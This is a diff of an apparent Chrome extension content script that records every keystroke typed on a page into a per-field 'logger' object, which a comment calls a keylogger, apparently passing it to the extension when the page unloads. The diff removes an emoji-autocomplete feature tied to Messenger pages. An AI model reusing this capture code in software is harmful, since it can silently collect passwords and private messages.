@@ -3,29 +3,12 @@ var logger = new Object();
 var activeElement = null;
 var selectedText = null;
 var copiedText = null;
-// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-var autocomplete = false;
-var emojis = null;
-var activeElementDOM = null;
-// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
 
 const BACKSPACE = 8;
 const ENTER = 13;
 const SPACE = 32;
 
-// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-chrome.runtime.onMessage.addListener(
-    function(request, sender) {
-        if(request) {
-            var title = document.getElementById('pageTitle');
-            if(title && title.textContent == "Messenger") {
-                emojis = request;
-                autocomplete = true;
-            }
-        }
-    }
-);
-// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
+
 
 window.onbeforeunload = function() {
     if(chrome.runtime)
@@ -35,17 +18,10 @@ window.onbeforeunload = function() {
 document.onload = function() {
     activeElement = document.activeElement.name;
     selectedText = null;
-
-    // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-    activeElementDOM = document.activeElement;
-    // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
 }
 
 window.onload = function() {
     activeElement = document.activeElement.name;
-     // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-     activeElementDOM = document.activeElement;
-     // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
 }
 
 document.onkeypress = function(event) {
@@ -55,12 +31,6 @@ document.onkeypress = function(event) {
         logger[activeElement] += key;
     else
         logger[activeElement] = key;
-    
-    // BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-    if(autocomplete && keyCode == SPACE) { //TODO: add all delimeters 
-        autocompleteEmoji();
-    }
-    // END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
 }
 
 // Remove Backspaces from Log
@@ -77,22 +47,6 @@ document.onkeydown = function(event) {
         }
     }         
 };
-
-// BEGIN: AUTOCOMPLETE FEATURE - CHROME EXTENSION
-function autocompleteEmoji() {
-    for (i in emojis) {
-        var emoji = emojis[i];
-        var position = logger[activeElement].indexOf(emoji.name);
-        if(position != -1) {
-            //replace in keylogger
-            logger[activeElement] = logger[activeElement].substring(0,position) + emoji.icon + logger[activeElement].substring(position+emoji.name.length);
-            //replace on page
-            console.log(activeElementDOM.textContent);
-        }
-    }
-    console.log(logger);
-}
-// END: AUTOCOMPLETE FEATURE - CHROME EXTENSION
 
 function updateActiveElement(event) {
     if(activeElement != document.activeElement.name) {
